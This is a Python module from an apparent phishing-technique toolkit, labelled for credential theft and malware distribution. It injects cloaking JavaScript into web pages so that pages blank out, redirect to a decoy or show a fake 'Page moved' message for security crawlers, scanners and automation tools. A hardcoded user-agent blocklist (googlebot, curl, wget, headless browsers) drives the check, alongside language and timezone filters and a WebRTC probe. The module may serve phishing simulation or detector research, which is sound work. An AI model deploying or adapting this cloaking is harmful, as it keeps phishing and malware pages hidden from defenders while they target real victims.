from __future__ import annotations

import json
from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)
from app.utils.html_utils import inject_script_into_head, parse_html, serialize_html
from app.utils.js_templates import GEOFENCE_COMBINED_TEMPLATE, GEOFENCE_UA_TEMPLATE


_GEOFENCE_V2_TEMPLATE = """\
(function(){{
  var blocked_uas = {blocked_ua_json};
  var allowed_langs = {allowed_langs_json};
  var allowed_tzs = {allowed_tz_json};
  var mode = '{mode}';
  var decoy_url = '{decoy_url}';

  function _deny(){{
    if (mode === 'redirect' && decoy_url) {{ window.location.href = decoy_url; return; }}
    if (mode === 'show_decoy') {{ document.body.innerHTML = '<h1>Page moved</h1>'; return; }}
    document.body.innerHTML = '';
  }}

  // UA check
  var ua = (navigator.userAgent || '').toLowerCase();
  for (var i = 0; i < blocked_uas.length; i++) {{
    if (ua.indexOf(blocked_uas[i].toLowerCase()) !== -1) {{ _deny(); return; }}
  }}
  // Language check
  var lang = (navigator.language || navigator.userLanguage || '').toLowerCase();
  var langOk = allowed_langs.length === 0;
  for (var j = 0; j < allowed_langs.length; j++) {{
    if (lang.indexOf(allowed_langs[j].toLowerCase()) !== -1) {{ langOk = true; break; }}
  }}
  if (!langOk) {{ _deny(); return; }}
  // Timezone check (Intl.DateTimeFormat)
  if (allowed_tzs.length) {{
    try {{
      var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
      var tzOk = false;
      for (var k = 0; k < allowed_tzs.length; k++) {{
        if (tz.toLowerCase().indexOf(allowed_tzs[k].toLowerCase()) !== -1) {{ tzOk = true; break; }}
      }}
      if (!tzOk) {{ _deny(); return; }}
    }} catch(e) {{}}
  }}
  // Optional WebRTC IP leak probe — best-effort signal only
  try {{
    var pc = new RTCPeerConnection({{iceServers: []}});
    pc.createDataChannel('');
    pc.createOffer().then(function(o){{ pc.setLocalDescription(o); }}).catch(function(){{}});
  }} catch(e) {{}}
}})();"""


class GeofenceTechnique(BaseTechnique):
    """
    T15 — Geo-fencing / IP-fencing / UA-fencing.

    Injects client-side JS that checks User-Agent strings against a blocklist
    of known crawlers/bots, and optionally checks browser language to infer
    geographic region. Non-target visitors see a blank/error page.
    """

    TECHNIQUE_ID: ClassVar[int] = 15
    TECHNIQUE_NAME: ClassVar[str] = "Geo/UA Fencing & Cloaking"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.ANTIBOT_CLOAKING
    CATEGORIES: ClassVar[list[Category]] = [Category.CREDENTIAL_THEFT, Category.MALWARE_DISTRIBUTION]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.HAS_HTML]
    DESCRIPTION: ClassVar[str] = (
        "Injects JS that blocks crawlers (by UA pattern) and optionally filters "
        "by browser language (geo proxy). Bots and non-target visitors see an "
        "empty or error page."
    )
    _DEFAULT_UAS: ClassVar[list[str]] = [
        "bot", "crawl", "spider", "scan", "curl", "wget",
        "python", "java", "go-http", "okhttp", "headless", "phantom",
        "selenium", "playwright", "puppeteer",
        "googlebot", "bingbot", "mj12bot", "duckduckbot", "slurp",
        "yandexbot", "baiduspider", "semrushbot", "ahrefsbot",
        "scrapy", "requests/", "node-fetch", "httpclient", "lighthouse",
    ]

    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="blocked_ua_patterns",
            description="UA substrings to block (crawlers, scanners)",
            type=list,
            default=_DEFAULT_UAS,
        ),
        OptionSpec(
            name="allowed_languages",
            description="Browser language prefixes to allow (empty = allow all)",
            type=list,
            default=[],
        ),
        OptionSpec(
            name="allowed_timezones",
            description="Timezone substrings to allow (empty = skip TZ check)",
            type=list,
            default=[],
        ),
        OptionSpec(
            name="fence_type",
            description="'ua', 'geo', 'combined', or 'v2' (UA+lang+TZ+WebRTC)",
            type=str,
            default="v2",
        ),
        OptionSpec(
            name="mode",
            description="What to do on block: 'block' (blank), 'redirect', or 'show_decoy'",
            type=str,
            default="block",
        ),
        OptionSpec(
            name="decoy_url",
            description="Redirect target for mode=redirect (blank = stay)",
            type=str,
            default="",
        ),
    ]

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        blocked_ua: list[str] = options.get("blocked_ua_patterns", self._DEFAULT_UAS)
        allowed_langs: list[str] = options.get("allowed_languages", [])
        allowed_tzs: list[str] = options.get("allowed_timezones", [])
        fence_type: str = options.get("fence_type", "v2")
        mode: str = options.get("mode", "block")
        decoy_url: str = options.get("decoy_url", "")

        soup = parse_html(html)
        checks_used: list[str] = []

        if fence_type == "ua":
            js = GEOFENCE_UA_TEMPLATE.format(
                blocked_ua_json=json.dumps(blocked_ua)
            )
            checks_used = ["ua"]
        elif fence_type == "geo":
            js = GEOFENCE_COMBINED_TEMPLATE.format(
                blocked_ua_json=json.dumps([]),
                allowed_langs_json=json.dumps(allowed_langs),
            )
            checks_used = ["lang"]
        elif fence_type == "combined":
            js = GEOFENCE_COMBINED_TEMPLATE.format(
                blocked_ua_json=json.dumps(blocked_ua),
                allowed_langs_json=json.dumps(allowed_langs),
            )
            checks_used = ["ua", "lang"]
        else:
            js = _GEOFENCE_V2_TEMPLATE.format(
                blocked_ua_json=json.dumps(blocked_ua),
                allowed_langs_json=json.dumps(allowed_langs),
                allowed_tz_json=json.dumps(allowed_tzs),
                mode=mode,
                decoy_url=decoy_url,
            )
            checks_used = ["ua", "lang"]
            if allowed_tzs:
                checks_used.append("tz")
            checks_used.append("webrtc")

        inject_script_into_head(soup, js)

        self.log("info", "geofence_applied",
                 fence=fence_type, mode=mode,
                 ua_count=len(blocked_ua),
                 langs=len(allowed_langs), tzs=len(allowed_tzs))

        return ApplyResult(
            modified_html=serialize_html(soup),
            modified_url=None,
            extra_files={},
            change_log=[
                self._make_change(
                    "geofence_injected",
                    f"Injected {fence_type} fencing (mode={mode}); "
                    f"blocks {len(blocked_ua)} UA patterns; "
                    f"allowed langs={allowed_langs or 'all'}",
                    details={
                        "fence_type": fence_type,
                        "mode": mode,
                        "checks": checks_used,
                        "blocked_ua_count": len(blocked_ua),
                        "allowed_langs": allowed_langs,
                        "allowed_timezones": allowed_tzs,
                        "decoy_url": decoy_url,
                    },
                )
            ],
        )

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        has_ua_check = html and "navigator.userAgent" in html
        if has_ua_check:
            signals.append("HTML checks navigator.userAgent")
        else:
            issues.append("HTML missing navigator.userAgent check")

        crawler_terms = ["bot", "crawl", "spider", "selenium", "headless"]
        ua_blocked = html and any(t in html.lower() for t in crawler_terms)
        if ua_blocked:
            signals.append("HTML contains crawler UA pattern(s) in blocklist")
        else:
            issues.append("No crawler UA patterns found in HTML script")

        has_deny = html and (
            "document.body.innerHTML" in html or "window.location.href" in html
        )
        if has_deny:
            signals.append("HTML has body-clear or redirect on blocked visitor")
        else:
            issues.append("HTML missing denial response (body clear or redirect)")

        entry = next((e for e in change_log if e.change_type == "geofence_injected"), None)
        if entry:
            ua_count = entry.details.get("blocked_ua_count", 0)
            if ua_count >= 5:
                signals.append(f"change_log: {ua_count} UA patterns blocked")
            else:
                issues.append(f"change_log shows only {ua_count} UA patterns")
        else:
            issues.append("No geofence_injected in change_log")

        passed = bool(has_ua_check and ua_blocked)
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"has_ua_check": has_ua_check, "ua_blocked": ua_blocked, "has_deny": has_deny},
        )
